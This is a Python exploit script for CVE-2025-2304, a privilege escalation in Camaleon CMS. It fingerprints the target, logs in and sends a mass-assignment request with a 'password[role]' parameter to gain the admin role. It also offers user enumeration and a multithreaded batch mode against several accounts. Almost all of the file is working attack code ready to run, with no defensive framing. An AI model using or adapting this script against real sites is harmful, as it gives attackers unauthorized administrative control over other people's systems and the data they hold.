#!/usr/bin/env python3
"""
CVE-2025-2304 - Camaleon CMS Privilege Escalation Exploit
Improved version with additional features and robustness
"""
import requests
import re
import sys
import argparse
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from concurrent.futures import ThreadPoolExecutor, as_completed

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    ENDC = '\033[0m'

class CamaleonExploit:
    def __init__(self, target, proxy=None, timeout=10, verbose=False):
        self.target = target.rstrip('/')
        self.timeout = timeout
        self.verbose = verbose
        self.session = self._get_session(proxy)
        
    def _get_session(self, proxy=None):
        """Create configured session"""
        s = requests.Session()
        s.verify = False
        s.timeout = self.timeout
        s.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        
        if proxy:
            s.proxies = {
                'http': proxy,
                'https': proxy
            }
            self.log(f"Using proxy: {proxy}", "INFO")
            
        return s

    def log(self, message, level="INFO"):
        """Enhanced logging"""
        levels = {
            "INFO": (Colors.BLUE, "*"),
            "SUCCESS": (Colors.GREEN, "+"),
            "ERROR": (Colors.RED, "-"),
            "WARNING": (Colors.YELLOW, "!"),
            "DEBUG": (Colors.MAGENTA, "?"),
            "RESULT": (Colors.CYAN, "â†’")
        }
        color, symbol = levels.get(level, (Colors.ENDC, "*"))
        
        if level == "DEBUG" and not self.verbose:
            return
            
        timestamp = time.strftime("%H:%M:%S")
        print(f"[{Colors.BOLD}{timestamp}{Colors.ENDC}] [{color}{symbol}{Colors.ENDC}] {message}")

    def check_vulnerability(self):
        """Check if target is potentially vulnerable"""
        self.log("Checking target vulnerability...", "INFO")
        
        # Check 1: Camaleon CMS fingerprint
        try:
            r = self.session.get(f"{self.target}/")
            indicators = [
                'camaleon',
                'cama-',
                'cama_',
                'content-management-system',
                'Camaleon CMS'
            ]
            
            found_indicators = [i for i in indicators if i.lower() in r.text.lower()]
            
            if found_indicators:
                self.log(f"Camaleon CMS detected! Indicators: {', '.join(found_indicators)}", "SUCCESS")
            else:
                # Try admin page
                r2 = self.session.get(f"{self.target}/admin/login")
                if 'authenticity_token' in r2.text and 'user[password]' in r2.text:
                    self.log("Camaleon admin panel detected!", "SUCCESS")
                else:
                    self.log("Target may not be running Camaleon CMS", "WARNING")
                    return False
                    
        except requests.RequestException as e:
            self.log(f"Error during fingerprinting: {e}", "ERROR")
            return False
            
        return True

    def login(self, username, password):
        """Enhanced login with better error handling"""
        self.log(f"Authenticating as {username}...", "INFO")
        
        try:
            # Get login page and CSRF token
            r = self.session.get(f"{self.target}/admin/login")
            
            if r.status_code != 200:
                self.log(f"Login page returned status {r.status_code}", "ERROR")
                return False
                
            # Try multiple CSRF token patterns
            csrf_patterns = [
                r'authenticity_token" value="([^"]+)"',
                r'name="authenticity_token" value="([^"]+)"',
                r'csrf-token" content="([^"]+)"',
                r'csrf-param" content="([^"]+)"'
            ]
            
            csrf = None
            for pattern in csrf_patterns:
                match = re.search(pattern, r.text)
                if match:
                    csrf = match.group(1)
                    break
                    
            if not csrf:
                self.log("Could not extract CSRF token", "ERROR")
                if self.verbose:
                    self.log(f"Response preview: {r.text[:500]}", "DEBUG")
                return False

            if self.verbose:
                self.log(f"CSRF token: {csrf[:20]}...", "DEBUG")

            # Perform login
            login_data = {
                'authenticity_token': csrf,
                'user[username]': username,
                'user[password]': password,
                'commit': 'Login'
            }
            
            r = self.session.post(
                f"{self.target}/admin/login",
                data=login_data,
                allow_redirects=True,
                headers={'Referer': f'{self.target}/admin/login'}
            )

            # Check login success
            success_indicators = ['dashboard', 'logout', 'profile', 'admin/dashboard']
            
            if any(indicator in r.text.lower() for indicator in success_indicators):
                self.log("Login successful!", "SUCCESS")
                
                # Extract user ID from profile if possible
                user_id = self._extract_user_id(r.text)
                if user_id:
                    self.log(f"Current user ID: {user_id}", "INFO")
                    return user_id
                return True
            else:
                self.log("Login failed - invalid credentials or account locked", "ERROR")
                if self.verbose:
                    self.log(f"Response preview: {r.text[:500]}", "DEBUG")
                return False
                
        except requests.RequestException as e:
            self.log(f"Connection error during login: {e}", "ERROR")
            return False

    def _extract_user_id(self, html):
        """Extract user ID from page content"""
        patterns = [
            r'/admin/users/(\d+)/edit',
            r'/admin/users/(\d+)/updated_ajax',
            r'user_id[":=]\s*(\d+)',
            r'data-user-id="(\d+)"'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html)
            if match:
                return match.group(1)
        return None

    def exploit(self, user_id, new_password, target_role='admin'):
        """Execute the privilege escalation exploit"""
        self.log(f"Attempting privilege escalation to {target_role}...", "WARNING")
        
        try:
            # Get CSRF token for the update request
            r = self.session.get(f"{self.target}/admin/users/{user_id}/edit")
            
            # Extract CSRF token
            csrf_match = re.search(
                r'name="authenticity_token"[^>]*value="([^"]+)"',
                r.text
            )
            
            if not csrf_match:
                csrf_match = re.search(
                    r'authenticity_token"[^>]*value="([^"]+)"',
                    r.text
                )
                
            if not csrf_match:
                self.log("Could not extract CSRF token for exploit", "ERROR")
                return False
                
            csrf = csrf_match.group(1)
            
            if self.verbose:
                self.log(f"Exploit CSRF token: {csrf[:20]}...", "DEBUG")

            # Prepare exploit payload
            headers = {
                'X-Requested-With': 'XMLHttpRequest',
                'X-CSRF-Token': csrf,
                'Accept': '*/*',
                'Origin': self.target,
                'Referer': f'{self.target}/admin/users/{user_id}/edit',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
            }
            
            # The core exploit: mass assignment with role parameter
            data = {
                '_method': 'patch',
                'authenticity_token': csrf,
                'password[password]': new_password,
                'password[password_confirmation]': new_password,
                'password[role]': target_role,  # Critical: role escalation
                # Additional potential vectors:
                # 'user[role]': target_role,
                # 'user[role_id]': '1',
                # 'password[role_id]': '1'
            }

            if self.verbose:
                self.log(f"Payload: {data}", "DEBUG")

            # Send exploit
            r = self.session.post(
                f"{self.target}/admin/users/{user_id}/updated_ajax",
                headers=headers,
                data=data,
                allow_redirects=False
            )

            # Analyze response
            if r.status_code == 200:
                self.log("Exploit request successful (HTTP 200)!", "SUCCESS")
                
                # Try to verify the role change
                time.sleep(2)  # Wait for changes to propagate
                verification = self._verify_role_change()
                
                if verification:
                    self.log(f"Successfully escalated to {target_role}!", "SUCCESS")
                    self.log(f"New password for user {user_id}: {new_password}", "RESULT")
                    return True
                else:
                    self.log("Role escalation may have failed - manual verification recommended", "WARNING")
                    return True  # Still return True as exploit request succeeded
                    
            else:
                self.log(f"Exploit failed with status code: {r.status_code}", "ERROR")
                if self.verbose and r.text:
                    self.log(f"Response: {r.text[:200]}", "DEBUG")
                return False
                
        except requests.RequestException as e:
            self.log(f"Connection error during exploitation: {e}", "ERROR")
            return False

    def _verify_role_change(self):
        """Verify if role escalation was successful"""
        try:
            r = self.session.get(f"{self.target}/admin/dashboard")
            
            # Check for admin-only elements
            admin_indicators = [
                'manage users',
                'site settings',
                'plugins',
                'themes',
                'admin/users',
                'role="admin"'
            ]
            
            found = [i for i in admin_indicators if i.lower() in r.text.lower()]
            
            if found:
                self.log(f"Admin privileges confirmed! Indicators: {', '.join(found)}", "SUCCESS")
                return True
                
            return False
            
        except:
            return False

    def enumerate_users(self):
        """Attempt to enumerate users (if permissions allow)"""
        self.log("Attempting user enumeration...", "INFO")
        
        try:
            r = self.session.get(f"{self.target}/admin/users")
            
            # Try to extract user IDs from the page
            user_ids = re.findall(r'/admin/users/(\d+)/edit', r.text)
            
            if user_ids:
                unique_ids = sorted(set(user_ids))
                self.log(f"Found {len(unique_ids)} user(s): {', '.join(unique_ids)}", "SUCCESS")
                return unique_ids
            else:
                self.log("No users found or insufficient permissions", "WARNING")
                return []
                
        except requests.RequestException as e:
            self.log(f"Error during user enumeration: {e}", "ERROR")
            return []

    def batch_exploit(self, usernames, password, target_role='admin', max_workers=5):
        """Attempt exploit on multiple usernames/users"""
        self.log(f"Starting batch exploitation on {len(usernames)} target(s)...", "INFO")
        
        results = []
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = []
            for username in usernames:
                futures.append(
                    executor.submit(self.full_exploit_chain, username, password, target_role)
                )
            
            for future in as_completed(futures):
                try:
                    result = future.result(timeout=30)
                    results.append(result)
                except Exception as e:
                    self.log(f"Batch task error: {e}", "ERROR")
                    
        return results

    def full_exploit_chain(self, username, new_password, target_role='admin'):
        """Complete exploit chain from login to escalation"""
        self.log(f"Processing user: {username}", "INFO")
        
        # Step 1: Login
        login_result = self.login(username, new_password)
        
        if not login_result:
            return {'username': username, 'success': False, 'reason': 'Login failed'}
            
        # Step 2: Get user ID if not already obtained
        user_id = login_result if isinstance(login_result, str) else None
        
        if not user_id:
            # Try to get user ID from profile
            try:
                r = self.session.get(f"{self.target}/admin/profile/edit")
                user_id = self._extract_user_id(r.text)
            except:
                pass
                
        if not user_id:
            self.log("Could not determine user ID, attempting enumeration...", "WARNING")
            users = self.enumerate_users()
            if users:
                user_id = users[0]  # Use first found user
        
        if not user_id:
            return {'username': username, 'success': False, 'reason': 'Could not determine user ID'}
            
        # Step 3: Execute exploit
        self.log(f"Using user ID: {user_id}", "INFO")
        success = self.exploit(user_id, new_password, target_role)
        
        return {
            'username': username,
            'user_id': user_id,
            'success': success,
            'target_role': target_role
        }

def main():
    parser = argparse.ArgumentParser(
        description="CVE-2025-2304 - Camaleon CMS Privilege Escalation Exploit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s http://target.com admin newpass123
  %(prog)s http://target.com admin newpass123 -v --proxy http://127.0.0.1:8080
  %(prog)s http://target.com admin newpass123 --role superadmin --timeout 15
        """
    )
    
    # Required arguments
    parser.add_argument("url", help="Target Camaleon CMS URL")
    parser.add_argument("username", help="Username to exploit")
    parser.add_argument("password", help="New password to set")
    
    # Optional arguments
    parser.add_argument("-r", "--role", default="admin", 
                       help="Target role to escalate to (default: admin)")
    parser.add_argument("--user-id", help="Specific user ID to target (optional)")
    parser.add_argument("--proxy", help="HTTP proxy (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--timeout", type=int, default=10, 
                       help="Request timeout in seconds (default: 10)")
    parser.add_argument("-v", "--verbose", action="store_true", 
                       help="Verbose output")
    parser.add_argument("--enumerate", action="store_true",
                       help="Enumerate users before exploitation")
    parser.add_argument("--batch", nargs="+", 
                       help="Batch exploit multiple usernames")
    parser.add_argument("--no-check", action="store_true",
                       help="Skip vulnerability check")
    parser.add_argument("--output", help="Save results to file")
    
    args = parser.parse_args()
    
    # Initialize exploit class
    exploit = CamaleonExploit(
        target=args.url,
        proxy=args.proxy,
        timeout=args.timeout,
        verbose=args.verbose
    )
    
    print(f"\n{Colors.BOLD}{'='*60}{Colors.ENDC}")
    print(f"{Colors.BOLD}CVE-2025-2304 - Camaleon CMS Privilege Escalation{Colors.ENDC}")
    print(f"{Colors.BOLD}{'='*60}{Colors.ENDC}\n")
    
    # Vulnerability check
    if not args.no_check and not exploit.check_vulnerability():
        response = input("\nContinue anyway? (y/N): ").lower()
        if response != 'y':
            sys.exit(1)
    
    # Batch mode
    if args.batch:
        results = exploit.batch_exploit(args.batch, args.password, args.role)
        
        print(f"\n{Colors.BOLD}Batch Results:{Colors.ENDC}")
        print("-" * 40)
        for result in results:
            status = f"{Colors.GREEN}SUCCESS{Colors.ENDC}" if result['success'] else f"{Colors.RED}FAILED{Colors.ENDC}"
            reason = f" - {result.get('reason', '')}" if not result['success'] else ""
            print(f"{result['username']}: {status}{reason}")
            
        successful = sum(1 for r in results if r['success'])
        print(f"\nSuccessful: {successful}/{len(results)}")
        
    else:
        # Single target mode
        if args.enumerate:
            users = exploit.enumerate_users()
            if users and len(users) > 1:
                print(f"\nFound users: {', '.join(users)}")
                if not args.user_id:
                    args.user_id = users[0]
                    print(f"Using user ID: {args.user_id}")
        
        # Execute full exploit chain
        result = exploit.full_exploit_chain(args.username, args.password, args.role)
        
        if result['success']:
            print(f"\n{Colors.BOLD}Exploit completed successfully!{Colors.ENDC}")
            print(f"Username: {result['username']}")
            print(f"User ID: {result.get('user_id', 'N/A')}")
            print(f"New password: {args.password}")
            print(f"Escalated to: {args.role}")
        else:
            print(f"\n{Colors.BOLD}Exploit failed: {result.get('reason', 'Unknown error')}{Colors.ENDC}")
            sys.exit(1)
    
    # Save results if requested
    if args.output and 'result' in locals():
        try:
            with open(args.output, 'w') as f:
                import json
                json.dump(result if not args.batch else results, f, indent=2)
            exploit.log(f"Results saved to {args.output}", "SUCCESS")
        except Exception as e:
            exploit.log(f"Failed to save results: {e}", "ERROR")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Exploit interrupted by user{Colors.ENDC}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Unexpected error: {e}{Colors.ENDC}")
        if 'verbose' in locals() and verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)
